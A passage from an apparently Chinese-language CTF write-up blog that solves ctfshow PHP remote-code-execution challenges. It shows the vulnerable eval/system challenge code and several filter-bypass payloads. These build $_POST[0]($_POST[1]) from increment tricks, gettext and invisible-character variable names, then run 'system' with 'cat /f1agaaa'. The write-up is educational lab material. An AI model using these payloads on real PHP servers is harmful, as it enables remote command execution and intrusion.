class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[0]($$_[1]);</span><br></pre></td></tr></table></figure><p><strong>paylaod2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(<span class="number">0</span>/<span class="number">0</span>);<span class="comment">//NAN</span></span><br><span class="line"><span class="variable">$a</span>.=_;<span class="comment">//NAN_</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$a</span>[<span class="number">0</span>];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$o</span>=<span class="variable">$a</span>++;<span class="comment">//$o=$a++æ˜¯å…ˆæŠŠ$açš„å€¼ç»™$o,ç„¶åå†å¯¹$aè¿›è¡Œè‡ªå¢ï¼Œæ‰€ä»¥è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aæ˜¯Pï¼Œ$oæ˜¯O</span></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$a</span>++;<span class="comment">//$a=&gt;Q,$p=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$s</span>=<span class="variable">$a</span>++;<span class="comment">//S</span></span><br><span class="line"><span class="variable">$t</span>=<span class="variable">$a</span>;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_;<span class="comment">//_</span></span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$p</span>.<span class="variable">$o</span>.<span class="variable">$s</span>.<span class="variable">$t</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);<span class="comment">//$_POST[0]($_POST[1]);</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(<span class="number">0</span>/<span class="number">0</span>);$%ff.=_;$%ff=$%ff[<span class="number">0</span>];$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fd=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fe=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fc=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fb=$%ff;<span class="variable">$_</span>=_;<span class="variable">$_</span>.=$%fe.$%fd.$%fc.$%fb;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /f1agaaa</span><br></pre></td></tr></table></figure><p><strong>%ff %fc  å•¥çš„æ˜¯ä¸å¯è§å­—ç¬¦</strong></p><p><img src="../images/6OR8G{3@$0C}Y(S_" alt="img">1JIJ[C.png)</p><p><strong>è¿™é‡Œå­—æ¯è¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ä¸å¯è§å­—ç¬¦æ¥ç»™å‚æ•°å‘½åï¼Œå­¦åˆ°äº†ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹</strong></p><h2 id="RCEæŒ‘æˆ˜4"><a href="#RCEæŒ‘æˆ˜4" class="headerlink" title="RCEæŒ‘æˆ˜4"></a>RCEæŒ‘æˆ˜4</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220223437262.png" alt="image-20230220223437262"></p><p>è¿™ä¸‹å­çš„è¯åªæœ‰è¿™äº›èƒ½è¿›è¡Œåˆ©ç”¨äº†</p><p>å°‘äº†ä¸ª1ï¼Œå¹¶ä¸”çš„è¯é•¿åº¦ä¹Ÿè¿›è¡Œäº†é™åˆ¶ã€‚</p><p>è¿˜æ˜¯å¯ä»¥ç”¨<strong>rce3</strong>çš„æ–¹æ³•ï¼Œå› ä¸º1æ²¡ç”¨åˆ°ï¼Œå¹¶ä¸”åªè¦åœ¨<strong>RCE3</strong>çš„åŸºç¡€ä¸Šé€‚å½“çš„ç¼©çŸ­å°±è¡Œäº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=(_/_._)[0];//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o=++<span class="variable">$a</span>;//<span class="variable">$o</span>=++<span class="variable">$a</span>æ˜¯å…ˆæŠŠ<span class="variable">$a</span>è¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ <span class="variable">$a</span>å’Œ<span class="variable">$o</span>éƒ½æ˜¯O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o=++<span class="variable">$a</span>.<span class="variable">$o</span>;//<span class="variable">$o</span>=&gt;PO,<span class="variable">$a</span>=&gt;P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a++;//Q</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a++;//R</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o.=++<span class="variable">$a</span>;//<span class="variable">$o</span>=&gt;POS,<span class="variable">$a</span>=&gt;S</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o.=++<span class="variable">$a</span>;//<span class="variable">$o</span>=&gt;POST,<span class="variable">$a</span>=&gt;T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=_.<span class="variable">$o</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$_</span>[0]($<span class="variable">$_</span>[_]);//<span class="variable">$_POST</span>[0](<span class="variable">$_POST</span>[_]);</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯è¿˜æ˜¯åˆ©ç”¨ä¸å¯è§å­—ç¬¦æ›¿ä»£phpå˜é‡åç§°(è¿™é‡Œçš„payloadå¾—ç”¨bpå‘åŒ…ï¼Œå› ä¸ºhackbarçš„è¯ä¸ä¼šè§£æ7fä»¥åçš„å­—ç¬¦)</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[<span class="number">0</span>];$%fe=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;$%fe=%<span class="number">2</span>b%<span class="number">2</span>b$%ff.$%fe;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fe.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;$%fe.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$_</span>=_.$%fe;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);&amp;<span class="number">0</span>=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜5"><a href="#RCEæŒ‘æˆ˜5" class="headerlink" title="RCEæŒ‘æˆ˜5"></a>RCEæŒ‘æˆ˜5</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220224606275.png" alt="image-20230220224606275"></p><p>è¿™é‡Œçš„è¯æ˜¯æŠŠ01éƒ½ç»™è¿‡æ»¤æ‰äº†ï¼Œé•¿åº¦ä¹Ÿæ›´çŸ­äº†</p><p>é™åˆ¶73ä¸ªå­—ç¬¦ï¼Œè€Œä¸”0ä¹Ÿä¸å¯ä»¥ç”¨äº†ï¼Œä½†æ˜¯è¿™é‡Œè§‚å¯Ÿåˆ°phpinfoå®‰è£…äº†ä¸€ä¸ªæ‰©å±•gettextï¼Œè¯¥æ‰©å±•æ”¯æŒå‡½æ•°<code>_()</code> ,ç›¸å½“äº<code>gettext()</code>ï¼Œç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚å¦å¤–ï¼Œå…¶å®æ•°ç»„ä¸‹æ ‡ä½¿ç”¨æœªå®šä¹‰å¸¸é‡ï¼Œphpä¼šwarningï¼Œä½†æ˜¯å¯ä»¥ç»§ç»­è¿è¡Œï¼Œå¹¶è¿”å›ä¸‹æ ‡ä¸º0çš„å­—ç¬¦ï¼ˆç°è±¡æ˜¯è¿™æ ·ä½†æ˜¯å®é™…æœºåˆ¶éœ€è¦çœ‹phpæºç ï¼‰ã€‚å…¶ä½™çŸ¥è¯†ç‚¹ä¸Šé¢éƒ½å·²ç»è®²è¿‡äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯é ç»éªŒå’Œç§¯ç´¯å¯¹payloadè¿›è¡Œç²¾ç®€ï¼Œä¸‹é¢æ˜¯payloadæ„é€ è¿‡ç¨‹ï¼š</p><p><strong>EXP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//ç›¸å½“äºgettext(0/0)[0],å¾—åˆ°N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¸¸è§„çš„æ›¿æ¢æˆä¸å¯è§å­—ç¬¦å˜é‡åç§°ï¼Œå¾—åˆ°payloadï¼š</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=<span class="title function_ invoke__">_</span>(%ff/%ff)[%ff];<span class="variable">$_</span>=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$_</span>=_.%<span class="number">2</span>b%<span class="number">2</span>b$%ff.<span class="variable">$_</span>;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;<span class="variable">$_</span>.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff.%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure><h3 id="æ›´çŸ­çš„payload-72ä½"><a href="#æ›´çŸ­çš„payload-72ä½" class="headerlink" title="æ›´çŸ­çš„payload(72ä½)"></a>æ›´çŸ­çš„payload(72ä½)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p><strong>payload1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO  ç›¸å¯¹äºä¸Šä¸€æ­¥ï¼Œå°±æ˜¯è¿›è¡Œäº†è¿™ä¸€æ­¥çš„ä¿®æ”¹</span></span><br></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆ<code>$_=$a.$a++;</code>è¿™ä¸€æ­¥å¾—åˆ°çš„æ˜¯POè€Œä¸æ˜¯OPï¼Œæˆ–è€…OOï¼Œè€Œ<code>$_=_.$a.$a++;</code>å¾—åˆ°çš„æ˜¯<code>_OO</code>,ç»è¿‡å’Œç”¨è¿™ç§åšæ³•çš„å¸ˆå‚…ä»¬è®¨è®ºï¼Œç›®å‰åˆ†æä¸‹æ¥æœ€æœ‰å¯èƒ½çš„åŸå› æ˜¯ï¼ŒPHPåœ¨åšå­—ç¬¦ä¸²æ‹¼æ¥çš„è¿‡ç¨‹ä¸­ï¼ˆ.æ“ä½œï¼‰ï¼Œæ˜¯ä¸€ä¸ªä»å·¦åˆ°å³é€’å½’çš„è¿‡ç¨‹ï¼Œè€Œ<code>++</code>æ“ä½œç±»ä¼¼äºä¸€ä¸ªå‡½æ•°ï¼Œphpåœ¨æ‰§è¡Œå®Œå‡½æ•°åï¼Œå†åšæ‹¼æ¥çš„æ“ä½œï¼Œ<code>$_=$a.$a++;//PO</code>è¿™é‡Œç›¸å½“äºå…ˆæ‰§è¡Œäº†<code>$a++</code>æ“ä½œï¼ˆå‡½æ•°ï¼‰ï¼Œå¹¶å¾—åˆ°<code>$a++</code>çš„è¿”å›å€¼ï¼Œç„¶åå’Œå·¦ä¾§çš„<code>$a</code>å˜é‡è¿›è¡Œæ‹¼æ¥ï¼Œæ­¤æ—¶<code>$a</code>å·²ç»æ˜¯Päº†ã€‚è€Œ<code>$_=_.$a.$a++;</code>æ—¶å…ˆæ‰§è¡Œäº†<code>_</code>å’Œ<code>$a</code>çš„æ‹¼æ¥ï¼Œè€Œåå†æ‰§è¡Œ<code>$_=&#39;_O&#39;.$a++</code>ï¼Œæ‰€ä»¥å¾—åˆ°çš„æ˜¯<code>_OO</code>ã€‚*ä»¥ä¸Šæ‰€æœ‰å‡ä¸ºçŒœæµ‹ï¼Œå…·ä½“æœºåˆ¶éœ€ç ”ç©¶PHPæºç ã€‚</p><h3 id="68ä½å­—ç¬¦"><a href="#68ä½å­—ç¬¦" class="headerlink" title="68ä½å­—ç¬¦"></a>68ä½å­—ç¬¦</h3><p>ç›®å‰åœ¨gettextç¯å¢ƒä¸‹ï¼Œæœ€çŸ­çš„payloadäº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=_(a/a)[_];//N</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=++<span class="variable">$_</span>;//O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>]($<span class="variable">$a</span>[_]);//å·§å¦™çš„æŠŠä¸¤æ¬¡<span class="variable">$_</span>++æ”¾åœ¨ä¸€èµ·</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯phpè§£ææ˜¯ä»å·¦åˆ°å³é€’å½’çš„è¿‡ç¨‹ï¼Œè¿™é‡Œæœ‰ç–‘é—®çš„è¯ä¸€èˆ¬éƒ½æ˜¯<code>$a[$_++/$_++]</code>å¯¹è¿™ä¸ªæœ‰ç–‘é—®ï¼Œç„¶åæˆ‘å°±æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯è¿™æ ·çš„</p><p>å°±æ˜¯<code>$a</code>çš„è¯æ˜¯ä¸ºOçš„ï¼Œç„¶å[P/Q]å°±ä¼šè¢«è§£ææˆ[0],ç„¶å$a[0]å°±æ˜¯$açš„å€¼ã€‚</p><p><strong>å¯ä»¥æœ¬åœ°è·‘ä¸€ä¸‹çœ‹çœ‹ç»“æœã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=O;<span class="comment">//O</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[P/Q];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230221183422744.png" alt="image-20230221183422744"></p><p><strong>payload</strong>(ç”¨ä¸å¯è§å­—ç¬¦æ›¿ä»£å‚æ•°)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸Šé¢çš„é¢˜ç›®å‡ ä¹å…¨æ˜¯æœ‰å…³äºè‡ªå¢rceçš„</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow RCEæé™æŒ‘æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-æé™å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/posts/85259dde.html"/>
      <url>/posts/85259dde.html</url>
      
        <content type="html"><![CDATA[<p>å…³äºgetFlag()å‡½æ•°çš„å‘½ä»¤æ‰§è¡Œ  <a href="https://www.anquanke.com/post/id/154284">æ–‡ç« </a></p><p>å®˜æ–¹wp <a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">æ–‡ç« </a></p><h2 id="æé™å‘½ä»¤æ‰§è¡Œ1"><a href="#æé™å‘½ä»¤æ‰§è¡Œ1" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ1"></a>æé™å‘½ä»¤æ‰§è¡Œ1</h2><p>é¢˜ç›®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="comment">//flagåœ¨æ ¹ç›®å½•flagé‡Œï¼Œæˆ–è€…ç›´æ¥è¿è¡Œæ ¹ç›®å½•getflag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œé¦–å…ˆè·‘ä¸€ä¸‹æ­£åˆ™ï¼Œå› ä¸ºä¸€äº›ä¸çŸ¥ååŸå› ï¼Œç›´æ¥æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œæ‰€æœ‰è¿›è¡ŒurlåŠ å¯†ä»¥åå»è§£å¯†äº†ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè·‘æ­£åˆ™çš„æ„æ€æ˜¯å› ä¸ºå¯ä»¥ç›´æ¥çœ‹å“ªäº›ç¬¦å·å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p><strong>ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥åé‡åˆ°è¿™ç§é¢˜å°±å¯ä»¥å…ˆå»è·‘ä¸€ä¸‹æ­£åˆ™ï¼Œçœ‹å“ªäº›å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230220104940596.png" alt="image-20230220104940596"></p><p>è¾“å‡ºçš„<code>urlencode</code>ç¼–ç çš„ç»“æœï¼Œç„¶åè¿›è¡Œè§£ç æŸ¥çœ‹</p><p><img src="../images/image-20230220105114058.png" 